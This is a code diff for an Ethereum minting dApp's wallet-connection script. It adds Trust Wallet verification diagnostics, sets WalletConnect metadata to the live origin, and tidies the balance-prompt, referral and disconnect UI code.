@@ -39,6 +39,47 @@ import { CONFIG } from './config.js';
   };
 
   // ==========================================================================
+  //  TRUST WALLET DETECTION
+  //  Trust Wallet's "Cannot verify" warning comes from WalletConnect Verify
+  //  API returning UNKNOWN for the domain. This helper only logs diagnostics;
+  //  the dApp cannot suppress the wallet-side warning.
+  // ==========================================================================
+  function isTrustWallet() {
+    const eth = window.ethereum;
+    return (
+      (eth && (eth.isTrust || eth.isTrustWallet)) ||
+      /TrustWallet/i.test(UA) ||
+      /Trust Wallet/i.test(UA)
+    );
+  }
+
+  function logVerifyDiagnostics() {
+    const actualOrigin = window.location.origin;
+    const declaredUrl  = DAPP_METADATA?.url || '';
+    const normalizedDeclared = declaredUrl.replace(/\/+$/, '');
+    const normalizedActual   = actualOrigin.replace(/\/+$/, '');
+
+    if (normalizedDeclared && normalizedDeclared !== normalizedActual) {
+      logDebug(
+        `⚠️ metadata.url mismatch: declared="${declaredUrl}" actual="${actualOrigin}". ` +
+        `Trust Wallet Verify API will mark this as INVALID / Cannot verify.`
+      );
+    } else {
+      logDebug(`✅ metadata.url matches actual origin: ${actualOrigin}`);
+    }
+
+    if (isTrustWallet()) {
+      logDebug(
+        '🔐 Trust Wallet detected. If you see "Cannot verify": ' +
+        '(1) Ensure this exact origin (including www / subdomain) is allowlisted in the Reown Dashboard. ' +
+        '(2) The domain must be reachable over HTTPS. ' +
+        '(3) "Couldn\'t check right now" may be a temporary Verify API outage — retry later. ' +
+        'No dApp JavaScript can bypass this wallet-side check.'
+      );
+    }
+  }
+
+  // ==========================================================================
   //  DEBUG PANEL
   // ==========================================================================
   const debugArea = document.createElement('div');
@@ -88,8 +129,9 @@ import { CONFIG } from './config.js';
 
   // ==========================================================================
   //  LIBRARY LOADING
-  //  Loads only @walletconnect/ethereum-provider — the bundled modal is used
-  //  via showQrModal:true. No separate @walletconnect/modal instance.
+  //  Only @walletconnect/ethereum-provider is loaded. Its bundled modal is
+  //  used via showQrModal:true — loading @walletconnect/modal separately
+  //  creates a second SignClient and breaks pairing.
   // ==========================================================================
   function withTimeout(promise, ms, label) {
     return Promise.race([
@@ -178,7 +220,7 @@ import { CONFIG } from './config.js';
   let cachedEthPrice = { value: 2200, ts: 0 };
 
   // ==========================================================================
-  //  SIZING — slimmer than the original, tuned per device
+  //  SIZING — slimmer, device-tuned
   // ==========================================================================
   const BTN_SIZING = isMobileDevice
     ? { padding: '10px 18px', fontSize: '13px', minWidth: '140px', radius: '7px' }
@@ -224,7 +266,7 @@ import { CONFIG } from './config.js';
         break;
       default:
         button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
-        // NOTE: this label must not change
+        // NOTE: label unchanged per requirement
         button.innerHTML = '<i class="fas fa-wallet" style="margin-right:6px"></i> Connect Wallet to Mint';
     }
   }
@@ -306,7 +348,8 @@ import { CONFIG } from './config.js';
   //  LOW-BALANCE PROMPT
   // ==========================================================================
   function hideLowBalancePrompt() {
-    document.getElementById('lowBalancePrompt')?.remove();
+    const el = document.getElementById('lowBalancePrompt');
+    if (el) el.style.display = 'none';
   }
 
   function showLowBalancePrompt(currentUSD) {
@@ -320,11 +363,12 @@ import { CONFIG } from './config.js';
       margin-top: 12px; margin-left: auto; margin-right: auto;
       max-width: 420px; width: 100%; padding: 12px 14px;
       background: linear-gradient(135deg, #FFFBEB 0%, #FEF3C7 100%);
-      border: 1px solid #F59E0B; border-radius: 9px; color: #78350F;
-      font-family: 'Inter', sans-serif;
+      border: 1px solid #F59E0B; border-radius: 9px;
+      color: #78350F; font-family: 'Inter', sans-serif;
       font-size: ${isMobileDevice ? '12px' : '12.5px'};
-      line-height: 1.5; text-align: left; box-sizing: border-box;
+      line-height: 1.5; text-align: left;
       box-shadow: 0 4px 14px rgba(245, 158, 11, 0.15);
+      box-sizing: border-box;
     `;
     prompt.innerHTML = `
       <div style="display:flex;gap:9px;align-items:flex-start;">
@@ -334,9 +378,9 @@ import { CONFIG } from './config.js';
             Minimum Balance Required
           </strong>
           <span>
-            Your current balance is approximately <strong>$${currentUSD.toFixed(2)}</strong>,
-            which is below the <strong>$${MIN_BALANCE_USD.toFixed(2)}</strong> minimum in ETH
-            required to cover network gas fees. Please add funds to your wallet to proceed.
+            Your current balance is approximately <strong>$${currentUSD.toFixed(2)}</strong>, which is below the
+            <strong>$${MIN_BALANCE_USD.toFixed(2)}</strong> minimum in ETH required to cover network gas fees.
+            Please add funds to your wallet to proceed with your claim.
           </span>
         </div>
       </div>
@@ -352,7 +396,8 @@ import { CONFIG } from './config.js';
       const eth = parseFloat(web3Instance.utils.fromWei(wei, 'ether'));
       const ethPrice = await getEthPriceUSD();
       const usd = eth * ethPrice;
-      logDebug(`Balance: ${eth.toFixed(6)} ETH ≈ $${usd.toFixed(2)} (ETH @ $${ethPrice.toFixed(0)})`);
+      logDebug(`Balance check: ${eth.toFixed(6)} ETH ≈ $${usd.toFixed(2)} (ETH @ $${ethPrice.toFixed(0)})`);
+
       if (usd < MIN_BALANCE_USD) showLowBalancePrompt(usd);
       else                        hideLowBalancePrompt();
     } catch (e) {
@@ -361,7 +406,7 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  REFERRAL — shown to every connected user
+  //  REFERRAL
   // ==========================================================================
   function triggerReferralModal(address) {
     if (referralShownThisSession) return;
@@ -400,8 +445,7 @@ import { CONFIG } from './config.js';
       display.id = 'connectedAddressDisplay';
       display.style.cssText = `
         margin-top: 10px; padding: ${isMobileDevice ? '8px 12px' : '8px 14px'};
-        font-family: 'JetBrains Mono', monospace;
-        font-size: ${isMobileDevice ? '12.5px' : '13px'};
+        font-family: 'JetBrains Mono', monospace; font-size: ${isMobileDevice ? '12.5px' : '13px'};
         color: #059669; text-align: center;
         background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
         border-radius: 7px; border: 1px solid #A7F3D0;
@@ -452,12 +496,17 @@ import { CONFIG } from './config.js';
     }, 1200);
   }
 
+  // ==========================================================================
+  //  UI RESET HELPERS
+  // ==========================================================================
   function resetConnectedUIOnly() {
     setButtonState(connectButton, 'normal');
     if (walletButton) setButtonState(walletButton, 'normal');
     document.getElementById('connectedAddressDisplay')?.remove();
     hideLowBalancePrompt();
     showStatus('Wallet disconnected', 'info');
+    // Deliberately keeps: activeProvider, wcProvider, injectedProvider,
+    // web3Instance, contractInstance, connectionMode, localStorage
   }
 
   function resetConnectedUIFull() {
@@ -533,35 +582,7 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  METADATA SANITISER — critical for Trust Wallet verification
-  // ==========================================================================
-  function buildTrustSafeMetadata(baseMetadata) {
-    const metadata = { ...baseMetadata };
-
-    // 1) Force metadata.url to the exact live origin.
-    //    Trust Wallet's Verify API compares this against the domain the user
-    //    is actually on. Any mismatch (www, trailing slash, http vs https,
-    //    subpath) produces an UNKNOWN / unverified warning.
-    const liveOrigin = window.location.origin;
-    metadata.url = liveOrigin;
-
-    // 2) Ensure HTTPS (except localhost where WC allows http).
-    const isLocalhost = /localhost|127\.0\.0\.1/i.test(liveOrigin);
-    if (metadata.url.startsWith('http://') && !isLocalhost) {
-      metadata.url = metadata.url.replace('http://', 'https://');
-    }
-
-    logDebug(`Trust metadata.url = ${metadata.url}`);
-    logDebug(`Live origin         = ${liveOrigin}`);
-    if (metadata.url !== liveOrigin) {
-      logDebug('⚠️ metadata.url differs from live origin — Trust Wallet may warn');
-    }
-
-    return metadata;
-  }
-
-  // ==========================================================================
-  //  WALLETCONNECT — correct setup
+  //  WALLETCONNECT — CORRECT SETUP
   // ==========================================================================
   async function initWalletConnect({ useFallbackId = false } = {}) {
     if (wcProvider) return wcProvider;
@@ -572,7 +593,26 @@ import { CONFIG } from './config.js';
       return null;
     }
 
-    const metadata = buildTrustSafeMetadata(DAPP_METADATA);
+    // ---------------------------------------------------------------
+    //  Build metadata with the EXACT runtime origin.
+    //  This is the single most important fix for Trust Wallet's
+    //  "Cannot verify" / mismatch warning. Verify API compares the
+    //  origin the user is actually on against metadata.url; any
+    //  difference (www, http/https, trailing slash) causes INVALID.
+    // ---------------------------------------------------------------
+    const actualOrigin = window.location.origin;
+    const metadata = {
+      ...DAPP_METADATA,
+      url: actualOrigin,                     // exact match, no guessing
+      icons: Array.isArray(DAPP_METADATA?.icons) ? DAPP_METADATA.icons : [],
+    };
+
+    // If running on http:// (non-localhost), upgrade to https://
+    const isLocalhost = /localhost|127\.0\.0\.1/i.test(actualOrigin);
+    if (metadata.url.startsWith('http://') && !isLocalhost) {
+      logDebug('⚠️ Upgrading metadata.url from http:// to https://');
+      metadata.url = metadata.url.replace('http://', 'https://');
+    }
 
     try {
       logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}… url=${metadata.url}`);
@@ -581,6 +621,7 @@ import { CONFIG } from './config.js';
       const opts = {
         projectId,
         chains: [MAINNET_ID],
+        // No optionalChains — CAIP-25 requires it be disjoint from chains.
         showQrModal: true,
         qrModalOptions: {
           themeMode: 'dark',
@@ -592,6 +633,7 @@ import { CONFIG } from './config.js';
           },
           enableExplorer: true,
         },
+        // eth_sign removed — modern wallets reject it.
         methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
         events: ['chainChanged', 'accountsChanged'],
         metadata,
@@ -779,14 +821,6 @@ import { CONFIG } from './config.js';
       saveWallet(address, 'walletconnect');
       updateConnectedUI(address, 'evm');
       logDebug(`✅ WC connected: ${address}`);
-
-      // If this was Trust Wallet, remind the developer to check domain setup.
-      if (detectInWalletBrowser()?.wallet === 'trust') {
-        logDebug('ℹ️ Trust Wallet detected — if the risk warning persists, confirm');
-        logDebug('   (a) metadata.url exactly matches this origin, and');
-        logDebug('   (b) the domain is allowlisted for the SAME projectId on Reown.');
-      }
-
       return address;
     } catch (e) {
       logDebug('WC enable error: ' + e.message);
@@ -804,7 +838,7 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  SOFT DISCONNECT
+  //  SOFT / HARD DISCONNECT
   // ==========================================================================
   async function softDisconnect() {
     if (isDisconnecting) return;
@@ -817,9 +851,6 @@ import { CONFIG } from './config.js';
     }
   }
 
-  // ==========================================================================
-  //  HARD DISCONNECT
-  // ==========================================================================
   async function hardDisconnect({ skipWalletCall = false } = {}) {
     if (isDisconnecting) return;
     isDisconnecting = true;
@@ -1019,9 +1050,11 @@ import { CONFIG } from './config.js';
     Web3Ctor         = libs.Web3;
     logDebug('✅ All libraries loaded');
 
+    logVerifyDiagnostics();
+
     if (window.location.protocol !== 'https:'
         && !/localhost|127\.0\.0\.1/.test(window.location.hostname)) {
-      logDebug('⚠️ Site is not on HTTPS — WalletConnect will likely reject connections');
+      logDebug('⚠️ Site is not on HTTPS — WalletConnect / Verify API will reject or warn');
     }
 
     setupEIP6963();
